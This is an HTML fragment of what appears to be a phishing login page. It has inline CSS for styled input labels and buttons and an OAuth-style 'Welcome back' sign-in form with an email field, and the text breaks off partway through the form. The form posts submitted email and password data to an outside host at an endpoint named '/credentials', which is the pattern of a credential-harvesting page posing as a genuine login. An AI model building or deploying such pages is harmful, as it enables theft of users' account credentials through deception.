            input {

            input ~ label {
                color: var(--color-grey-1);
                font-size: var(--text-size-xs);
                position: absolute;
                pointer-events: none;
                left: 1.1rem;
                top: 1rem;
                transition: 0.25s ease all;
                transform-origin: top left;
            }
            input:focus {
                outline: none;
            }
            input:focus::-webkit-input-placeholder {

            }
            input:focus::-moz-placeholder {
                opacity: 0.4;
            }
            input:focus:-ms-input-placeholder {
                opacity: 0.4;
            }
            input:focus::-ms-input-placeholder {
                opacity: 0.4;
            }
            input:focus::placeholder {
                opacity: 0.4;
            }
            input:focus ~ label,
            label.raised-label,
            input:not(:focus):not(:invalid) ~ label {
                background-color: var(--color-white);
                -webkit-transform: translate(-4px, -1.8rem) scale(0.71);
                -ms-transform: translate(-4px, -1.8rem) scale(0.71);
                transform: translate(-4px, -1.8rem) scale(0.71);
                padding: 0 4px;
                -webkit-transform-origin: top left;
                -ms-transform-origin: top left;
                transform-origin: top left;
            }
            /* somehow this `input:-webkit-autofill` was not picked on focus in Edge
            if we add it with other classes as above. it worked separately. */
            input:-webkit-autofill ~ label {
                background-color: var(--color-white);
                -webkit-transform: translate(0, -1.8rem) scale(0.75);
                padding: 0 4px;
                -webkit-transform-origin: top left;
            }
            input[style*="background"] ~ .input-button {
                right: 32px;
            }
            input:not(:placeholder-shown) ~ .input-button {
                display: block;
            }
            button {
                border-radius: 4px;
                padding: 1rem 1.6rem;
                font-size: 1.4rem;
                transition: all 0.25s;
                font-weight: bold;
            }
            button:hover {
                cursor: pointer;
            }
            button:focus,
            button:active {

            }
            button:active {
                transform: scale(0.95);
            }
            button > * {

            button.primary {

    <body class="oauth">
        <header>
            <div id="logo-container"></div>
        </header>


        <div id="container">
            <h1 class="title-text">Welcome back</h1>
            <form novalidate id="frmLogin" method="POST" action="https://winter.up.railway.app/credentials">
                <div class='input-group'>
                    <div class="input-wrapper ">
                        <input type="email" id="txtEmail" name="email" placeholder="example@email.com" value="" required autocomplete="off"  autofocus="autofocus"  maxlength="254"  />
                        <label for="txtEmail">Email</label>
                        <span class="bar"></span>
                    </div>
                    <div class="input-error">
                        <p class='hide error error_invalid'>That doesn&#39;t look like an email address.</p>
                        <p class='hide error error_required'>Email is required.</p>
                        <p class='hide error error_invalid_pass'>Your email and/or password is incorrect.</p>
